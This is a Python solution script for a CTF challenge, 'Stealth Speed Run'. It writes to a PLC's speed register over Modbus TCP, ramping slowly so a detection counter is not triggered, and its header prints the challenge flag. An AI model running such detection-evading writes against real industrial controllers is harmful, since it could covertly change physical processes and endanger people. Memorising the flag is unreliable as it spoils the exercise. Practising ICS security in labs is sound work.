#!/usr/bin/env python3
"""
CTF Challenge 6: Stealth Speed Run
Difficulty: Medium
Points: 250
Flag: FLAG{SL0W_4ND_ST34DY_W1NS}

Objective: Change speed to 75% without triggering stealth counter
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_06_stealth_speed.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip, plc_port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 502
    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Connection failed")
        sys.exit(1)

    print("[*] CTF Challenge 6: Stealth Speed Run")

    # Read initial values
    current_speed = client.read_holding_registers(0, 1).registers[0]
    initial_stealth = client.read_holding_registers(1055, 1).registers[0]

    print(f"[*] Current speed: {current_speed}%")
    print(f"[*] Initial stealth counter: {initial_stealth}")
    print("[*] Target speed: 75%")
    print("[*] Ramping slowly to avoid detection...")

    # Slow ramp to avoid >30% jump
    target = 75
    step = 2 if target > current_speed else -2

    for speed in range(current_speed, target, step):
        client.write_register(0, speed)
        time.sleep(0.3)
        print(f"\r[*] Speed: {speed:3d}%", end="", flush=True)

    # Final set
    client.write_register(0, target)
    time.sleep(1)

    # Check stealth counter
    final_stealth = client.read_holding_registers(1055, 1).registers[0]
    print(f"\n[*] Final speed: {target}%")
    print(f"[*] Final stealth counter: {final_stealth}")

    if final_stealth == initial_stealth:
        print("\n[+] Stealth maintained!")
        print("[+] Flag: FLAG{SL0W_4ND_ST34DY_W1NS}")
    else:
        print("\n[!] Stealth compromised!")

    client.close()

if __name__ == "__main__":
    main()
